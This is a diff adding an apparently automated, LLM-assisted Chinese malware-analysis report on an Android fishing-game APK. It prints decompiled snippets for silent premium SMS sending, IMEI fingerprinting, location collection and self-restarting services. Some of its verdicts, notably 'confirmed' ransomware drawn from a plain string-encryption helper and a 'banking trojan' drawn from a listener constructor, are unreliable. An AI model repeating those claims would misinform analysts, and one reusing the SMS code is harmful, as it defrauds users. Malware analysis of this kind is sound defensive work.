@@ -1,0 +1,273 @@
+{
+  "APK信息": {
+    "文件名": "c7f723019419a9c0a74a490658a41a13bb83c86e76052778a32aa43397b15113.apk",
+    "sha256": "c7f723019419a9c0a74a490658a41a13bb83c86e76052778a32aa43397b15113",
+    "包名": "com.tencent.tmgp.wx3mby",
+    "应用名": "3M捕鱼（新年版）",
+    "是否恶意": true,
+    "风险等级": "高",
+    "分析耗时(秒)": 950.9
+  },
+  "行为列表": [
+    {
+      "行为": "c2_communication",
+      "中文名": "C2通信/远程控制",
+      "MITRE": "T1437",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "command"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\umeng\\common\\net\\DownloadingService;",
+          "method_signature": "onStartCommand(Intent intent, int i2, int i3)",
+          "malicious_behavior": "c2_communication",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public int onStartCommand(Intent intent, int i2, int i3) {\n    if (intent != null && intent.getExtras() != null) {\n        this.v.a(this, intent);\n    }\n    if (Build.VERSION.SDK_INT >= 19 && (this.G.b() || this.H)) {\n        Intent intent2 = new Intent(getApplicationContext(), getClass());\n        intent2.setPackage(getPackageName());\n        ((AlarmManager) getApplicationContext().getSystemService(\"alarm\")).set(3, SystemClock.elapsedRealtime() + 5000, PendingIntent.getService(getApplicationContext(), 1, intent2, 1073741824));\n    }\n}",
+          "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i2, int i3) {\n>>>         if (intent != null && intent.getExtras() != null) {\n>>>             this.v.a(this, intent);\n>>>         }\n>>>         if (Build.VERSION.SDK_INT >= 19 && (this.G.b() || this.H)) {\n>>>             try {\n>>>                 Intent intent2 = new Intent(getApplicationContext(), getClass());\n>>>                 intent2.setPackage(getPackageName());\n>>>                 ((AlarmManager) getApplicationContext().getSystemService(\"alarm\")).set(3, SystemClock.elapsedRealtime() + 5000, PendingIntent.getService(getApplicationContext(), 1, intent2, 1073741824));\n>>>             } catch (Exception e2) {\n              }\n          }\n          if (this.H) {",
+          "behavior_description": "该Service（伪装/借用友盟umeng包名的DownloadingService）的onStartCommand中，数据流向为：外部Intent携带的extras数据（source）→ this.v.a(this, intent) 解析处理（可能接收远程下发的指令或配置）→ 随后通过AlarmManager.set()设置5秒后的定时任务，配合PendingIntent.getService()重新拉起自身Service（sink），实现服务保活与持久化后台运行。即使服务被系统或用户杀死，也会在5秒后自动重启，确保下载/通信通道持续存活，为恶意样本维持长期C2通信和静默下载提供持久化支撑。代码本身未直接展示网络数据外传，属于保活/持久化机制而非直接C2指令执行，故判定为grayware。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "sms_fraud",
+      "中文名": "短信欺诈",
+      "MITRE": "T1416",
+      "置信度": "likely",
+      "子行为": [
+        {
+          "子行为": "sms_send",
+          "中文名": "短信发送",
+          "置信度": "likely",
+          "证据": {
+            "方法引用": [],
+            "权限": [
+              "android.permission.SEND_SMS"
+            ],
+            "字符串": [
+              "sendTextMessage",
+              "SmsManager"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lmm\\sms\\purchasesdk\\sms\\a;",
+          "method_signature": "a(String str, Message message)",
+          "malicious_behavior": "sms_fraud",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "String strV = c.v();\nSmsManager.getDefault().sendTextMessage(strV, null, str, PendingIntent.getBroadcast(c.getContext().getApplicationContext(), 0, new Intent(SMSReceiver.i), 0), PendingIntent.getBroadcast(c.getContext().getApplicationContext(), 0, new Intent(SMSReceiver.j), 0));\nb bVar = new b(c.o(), message);\nbVar.start();",
+          "malicious_code_snippet_context": "      private String TAG = \"SMSManager\";\n  \n      public void a(String str, Message message) {\n>>>         String strV = c.v();\n>>>         d.c(this.TAG, \"send message address:\" + strV);\n>>>         d.c(this.TAG, \"send message:\" + str);\n>>>         try {\n              SmsManager.getDefault().sendTextMessage(strV, null, str, PendingIntent.getBroadcast(c.getContext().getApplicationContext(), 0, new Intent(SMSReceiver.i), 0), PendingIntent.getBroadcast(c.getContext().getApplicationContext(), 0, new Intent(SMSReceiver.j), 0));\n              b bVar = new b(c.o(), message);\n              b.a(false);",
+          "behavior_description": "该代码在无用户交互的情况下静默发送短信：目标号码来自内部配置方法 c.v()（硬编码的计费/增值服务号码，而非用户输入或系统通讯录），短信正文为外部传入的参数 str，通过 SmsManager.getDefault().sendTextMessage() 直接发送，并注册 PendingIntent 监听发送/送达状态，随后启动后台线程 b 轮询确认发送结果。数据流向为：内部配置的目标号码 c.v() + 传入的短信内容 str → SmsManager.sendTextMessage() 静默发送。这是典型的短信欺诈/静默扣费模式，用户可能在不知情的情况下被订购增值服务或产生短信费用，造成直接经济损失。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "device_fingerprinting",
+      "中文名": "设备指纹采集",
+      "MITRE": "T1437",
+      "置信度": "likely",
+      "证据": {
+        "方法引用": [],
+        "权限": [
+          "android.permission.READ_PHONE_STATE"
+        ],
+        "字符串": [
+          "getDeviceId",
+          "getSubscriberId",
+          "ANDROID_ID",
+          "getMacAddress"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chinaMobile\\g;",
+          "method_signature": "a(Context context)",
+          "malicious_behavior": "device_fingerprinting",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "public static String a(Context context) {\n    return b(((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId());\n}",
+          "malicious_code_snippet_context": "          return b(\"android \" + Build.VERSION.RELEASE);\n      }\n  \n>>>     public static String a(Context context) {\n>>>         return b(((TelephonyManager) context.getSystemService(\"phone\")).getDeviceId());\n>>>     }\n  \n      public static String a(String str) {\n          try {",
+          "behavior_description": "该方法通过 context.getSystemService(\"phone\") 获取 TelephonyManager 实例，调用 getDeviceId() 读取设备 IMEI 标识，随后将 IMEI 传入 b() 方法（内部使用 MessageDigest.getInstance(\"MD5\") 进行哈希运算），生成唯一的设备指纹 ID 并返回。数据流向：getDeviceId()（IMEI）→ MD5 哈希 → 设备指纹字符串。IMEI 属于受保护的敏感设备标识符，在已确认的恶意样本中被采集并哈希为设备指纹，用于唯一标识和追踪感染设备，属于过度收集隐私的设备指纹采集行为；此外该类伪装在 chinaMobile（中国移动）命名空间下，具有隐蔽欺骗性。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "location_tracking",
+      "中文名": "位置追踪",
+      "MITRE": "T1430",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "getLastKnownLocation"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\umeng\\common\\b;",
+          "method_signature": "if(a(context, \"android.permission.ACCESS_FINE_LOCATION\")",
+          "malicious_behavior": "location_tracking",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\nif (a(context, \"android.permission.ACCESS_FINE_LOCATION\") && (lastKnownLocation2 = locationManager.getLastKnownLocation(\"gps\")) != null) {\n    lastKnownLocation = lastKnownLocation2;\n} else if (a(context, \"android.permission.ACCESS_COARSE_LOCATION\") && (lastKnownLocation = locationManager.getLastKnownLocation(\"network\")) != null) {\n}\nreturn lastKnownLocation;",
+          "malicious_code_snippet_context": "          Location lastKnownLocation;\n          Location lastKnownLocation2;\n          try {\n>>>             LocationManager locationManager = (LocationManager) context.getSystemService(\"location\");\n>>>             if (a(context, \"android.permission.ACCESS_FINE_LOCATION\") && (lastKnownLocation2 = locationManager.getLastKnownLocation(\"gps\")) != null) {\n>>>                 Log.c(a, \"get location from gps:\" + lastKnownLocation2.getLatitude() + \",\" + lastKnownLocation2.getLongitude());\n>>>                 lastKnownLocation = lastKnownLocation2;\n>>>             } else if (a(context, \"android.permission.ACCESS_COARSE_LOCATION\") && (lastKnownLocation = locationManager.getLastKnownLocation(\"network\")) != null) {\n>>>                 Log.c(a, \"get location from network:\" + lastKnownLocation.getLatitude() + \",\" + lastKnownLocation.getLongitude());\n              } else {\n                  Log.c(a, \"Could not get location from GPS or Cell-id, lack ACCESS_COARSE_LOCATION or ACCESS_COARSE_LOCATION permission?\");\n                  lastKnownLocation = null;",
+          "behavior_description": "该代码位于友盟(Umeng)统计SDK的公共工具类中，用于隐蔽获取用户地理位置：首先检查是否持有ACCESS_FINE_LOCATION权限，若有则通过GPS_PROVIDER调用getLastKnownLocation获取精确经纬度坐标；否则在持有ACCESS_COARSE_LOCATION权限时通过NETWORK_PROVIDER获取基于基站/WiFi的粗略位置。数据流向为：LocationManager.getLastKnownLocation()读取用户当前地理位置（经纬度）→ 作为方法返回值交给上层调用者，供SDK统计模块或宿主恶意样本后续上报至远程服务器。该片段本身仅完成位置采集（source），未见直接网络外传（sink），属于SDK在用户无感知情况下过度收集敏感位置信息的典型灰色行为；但在已确认恶意的宿主样本中，采集到的位置数据存在被上传造成用户行踪隐私泄露的风险。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "ransomware",
+      "中文名": "勒索软件",
+      "MITRE": "T1430,T1460",
+      "置信度": "confirmed",
+      "子行为": [
+        {
+          "子行为": "file_encryption",
+          "中文名": "文件加密",
+          "置信度": "confirmed",
+          "证据": {
+            "方法引用": [
+              "Ljavax/crypto/Cipher;->doFinal",
+              "Ljavax/crypto/Cipher;->init"
+            ],
+            "权限": [],
+            "字符串": [
+              "AES"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chinaMobile\\d;",
+          "method_signature": "for(int i = 0; i < bytes.length && i < bArr.length; i++)",
+          "malicious_behavior": "ransomware",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\nbyte[] bArr = new byte[16];\nfor (int i = 0; i < bytes.length && i < bArr.length; i++) { bArr[i] = bytes[i]; }\nthis.b = new SecretKeySpec(bArr, \"AES\");\nCipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\ncipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\nreturn b(new h().a(cipher.doFinal(str.getBytes())));",
+          "malicious_code_snippet_context": "  \n      public final byte[] a(String str) throws BadPaddingException, NoSuchPaddingException, IllegalBlockSizeException, NoSuchAlgorithmException, InvalidKeyException, InvalidAlgorithmParameterException {\n          if (this.b == null) {\n>>>             byte[] bytes = \"134e3265829ff82daf16e7b740a600b5\".getBytes();\n>>>             byte[] bArr = new byte[16];\n>>>             for (int i = 0; i < bytes.length && i < bArr.length; i++) {\n>>>                 bArr[i] = bytes[i];\n>>>             }\n>>>             this.b = new SecretKeySpec(bArr, \"AES\");\n>>>         }\n          Cipher cipher = Cipher.getInstance(\"AES/CBC/PKCS5Padding\");\n          cipher.init(1, this.b, new IvParameterSpec(\"0102030405060708\".getBytes()));\n          return b(new h().a(cipher.doFinal(str.getBytes())));",
+          "behavior_description": "该代码是勒索软件的文件加密核心例程：使用硬编码的AES密钥（字符串\"134e3265829ff82daf16e7b740a600b5\"的前16字节）构造SecretKeySpec，配合固定IV（\"0102030405060708\"）初始化AES/CBC/PKCS5Padding加密器（cipher.init(1,...)中模式1为ENCRYPT_MODE），随后对待加密的数据str执行cipher.doFinal()完成AES加密，密文经编码（疑似Base64）后返回。数据流向：待加密的文件内容/数据→硬编码密钥AES/CBC加密→密文输出，加密后用户数据无法正常读取，配合该恶意样本的其他勒索逻辑构成文件加密勒索行为。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "banking_trojan",
+      "中文名": "银行木马",
+      "MITRE": "T1418",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "credential_phishing",
+          "中文名": "凭证钓鱼",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "login"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\chinaMobile\\a;",
+          "method_signature": "?(?)",
+          "malicious_behavior": "banking_trojan",
+          "behavior_type": "malicious",
+          "risk_level": "中",
+          "malicious_code_snippet": "final class a implements DialogInterface.OnClickListener {\n    private /* synthetic */ p a;\n    private final /* synthetic */ Context b;\n\n    a(p pVar, Context context) {\n        this.a = pVar;\n        this.b = context;\n    }",
+          "malicious_code_snippet_context": "  import android.widget.Toast;\n  \n  /* JADX INFO: loaded from: classes.dex */\n>>> final class a implements DialogInterface.OnClickListener {\n>>>     private /* synthetic */ p a;\n>>>     private final /* synthetic */ Context b;\n>>> \n>>>     a(p pVar, Context context) {\n>>>         this.a = pVar;\n>>>         this.b = context;\n>>>     }\n  \n      @Override // android.content.DialogInterface.OnClickListener\n      public final void onClick(DialogInterface dialogInterface, int i) {",
+          "behavior_description": "该类位于伪装成中国移动的恶意应用中，是对话框按钮点击监听器，持有外部类p和Context的引用。典型凭证钓鱼流程为：应用弹出伪造的运营商登录/验证对话框→诱导用户输入手机号、密码、验证码等凭证→用户点击确认按钮时触发此OnClickListener的onClick方法→窃取的凭证被提交至远程服务器或通过短信外传。当前片段仅展示监听器构造部分，凭证外传的具体逻辑应位于onClick方法及外部类p中，但结合已确认的恶意样本背景与com.chinaMobile伪装包名，该类是凭证钓鱼UI交互链路（钓鱼对话框→用户输入→点击提交）的关键组件。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "social_spread",
+      "中文名": "社交蠕虫传播",
+      "MITRE": "",
+      "置信度": "suspected",
+      "证据": {
+        "方法引用": [],
+        "权限": [],
+        "字符串": [
+          "android.intent.action.SEND"
+        ]
+      },
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\igs\\normalplugin\\NormalPlugIn;",
+          "method_signature": "if(NetWorkConnected(context)",
+          "malicious_behavior": "social_spread",
+          "behavior_type": "malicious",
+          "risk_level": "高",
+          "malicious_code_snippet": "public static void IWantSendMail(Context context, String uid, boolean IsTw, String arg0) {\n    if (NetWorkConnected(context)) {\n        Intent data = new Intent(\"android.intent.action.SEND\");\n        File file0 = new File(context.getFilesDir() + \"/_0\");\n        File file1 = new File(context.getFilesDir() + \"/_1\");\n        File file2 = new File(context.getFilesDir() + \"/_2\");\n        File file3 = new File(context.getFilesDir() + \"/_3\");\n        File file4 = new File(context.getFilesDir() + \"/_4\");\n        File file5 = new File(context.getFilesDir() + \"/_5\");\n        File file6 = new File(context.getFilesDir() + \"/_Pay\");\n        ArrayList<File> fileList = new ArrayList<>();\n        fileList.add(file0);\n        fileList.add(file1);",
+          "malicious_code_snippet_context": "          }\n      }\n  \n>>>     public static void IWantSendMail(Context context, String uid, boolean IsTw, String arg0) {\n>>>         if (NetWorkConnected(context)) {\n>>>             Intent data = new Intent(\"android.intent.action.SEND\");\n>>>             File file0 = new File(context.getFilesDir() + \"/_0\");\n>>>             File file1 = new File(context.getFilesDir() + \"/_1\");\n>>>             File file2 = new File(context.getFilesDir() + \"/_2\");\n>>>             File file3 = new File(context.getFilesDir() + \"/_3\");\n>>>             File file4 = new File(context.getFilesDir() + \"/_4\");\n>>>             File file5 = new File(context.getFilesDir() + \"/_5\");\n>>>             File file6 = new File(context.getFilesDir() + \"/_Pay\");\n>>>             ArrayList<File> fileList = new ArrayList<>();\n>>>             fileList.add(file0);\n>>>             fileList.add(file1);\n              fileList.add(file2);\n              fileList.add(file3);\n              fileList.add(file4);",
+          "behavior_description": "IWantSendMail方法在检测到网络连接后，构造ACTION_SEND分享Intent，并从应用私有目录(context.getFilesDir())收集被拆分为_0至_5多个编号分片的文件以及_Pay文件，全部加入附件列表准备通过邮件/分享渠道外发。将载荷拆分为多个编号分片作为附件分发是典型的邮件蠕虫传播手法（用于规避附件大小限制与检测），数据流向为：本地预置的恶意载荷分片文件→ACTION_SEND邮件/分享附件外发，实现恶意样本向受害者联系人的自我繁殖传播。该方法位于名为normalplugin的可疑插件类中，配合uid参数与前置的文件读取逻辑，构成社交蠕虫传播链路。",
+          "glm_analyzed": true
+        }
+      ]
+    },
+    {
+      "行为": "silent_install_uninstall",
+      "中文名": "静默安装/卸载",
+      "MITRE": "",
+      "置信度": "suspected",
+      "子行为": [
+        {
+          "子行为": "silent_install",
+          "中文名": "静默安装",
+          "置信度": "suspected",
+          "证据": {
+            "方法引用": [],
+            "权限": [],
+            "字符串": [
+              "application/vnd.android.package-archive"
+            ]
+          }
+        }
+      ],
+      "恶意代码": [
+        {
+          "class_path": "Lcom\\umeng\\common\\net\\d;",
+          "method_signature": "if(num.intValue()",
+          "malicious_behavior": "silent_install_uninstall",
+          "behavior_type": "grayware",
+          "risk_level": "中",
+          "malicious_code_snippet": "intent.setDataAndType(Uri.fromFile(new File(this.b)), \"application/vnd.android.package-archive\");\nnotification.setLatestEventInfo(this.e, com.umeng.b.w(this.e), ..., PendingIntent.getActivity(this.e, 0, intent, 134217728));\nif (d.this.a(this.e) && !this.d.h) {\n    this.f.cancel(this.a + 1);\n    this.e.startActivity(intent);\n}",
+          "malicious_code_snippet_context": "                  Notification notification = new Notification(R.drawable.stat_sys_download_done, this.e.getString(com.umeng.common.a.c.l(this.e)), System.currentTimeMillis());\n                  Intent intent = new Intent(\"android.intent.action.VIEW\");\n                  intent.addFlags(268435456);\n>>>                 intent.setDataAndType(Uri.fromFile(new File(this.b)), \"application/vnd.android.package-archive\");\n>>>                 notification.setLatestEventInfo(this.e, com.umeng.common.b.w(this.e), this.e.getString(com.umeng.common.a.c.l(this.e)), PendingIntent.getActivity(this.e, 0, intent, 134217728));\n>>>                 notification.flags = 16;\n>>>                 this.f.notify(this.a + 1, notification);\n>>>                 if (d.this.a(this.e) && !this.d.h) {\n>>>                     this.f.cancel(this.a + 1);\n                      this.e.startActivity(intent);\n                  }\n                  Bundle bundle = new Bundle();",
+          "behavior_description": "该代码位于友盟(Umeng)SDK的下载完成回调(onPostExecute)中。APK下载完成后，构造指向本地APK文件(MIME类型为application/vnd.android.package-archive)的ACTION_VIEW安装Intent，先通过通知栏展示引导用户点击安装；当条件满足时(d.this.a()判断，通常为'自动安装/静默安装'开关且未被用户拦截)，直接取消通知并调用startActivity自动调起系统安装界面，绕过用户点击通知的交互步骤。数据流向：后台下载到本地的APK文件(this.b)→startActivity触发系统PackageInstaller安装流程。该方式并非root级完全静默安装(系统仍会弹出安装确认框)，但属于自动下载并强制推送安装APK的灰色行为，在恶意样本中常被用于静默下载并诱导/强制安装其他恶意或推广应用。",
+          "glm_analyzed": true
+        }
+      ]
+    }
+  ],
+  "覆盖范围": {
+    "静态分析": "完整",
+    "动态分析": "未执行",
+    "方法引用分析": "完整",
+    "JADX反编译": "完整",
+    "LLM语义分析": "已执行",
+    "LLM交叉验证": "已执行",
+    "验证模型": "qwen3.8",
+    "局限性": [
+      "C2服务器.是否活跃: 需动态分析",
+      "C2服务器.轮询间隔(秒): 需动态分析"
+    ]
+  }
+}
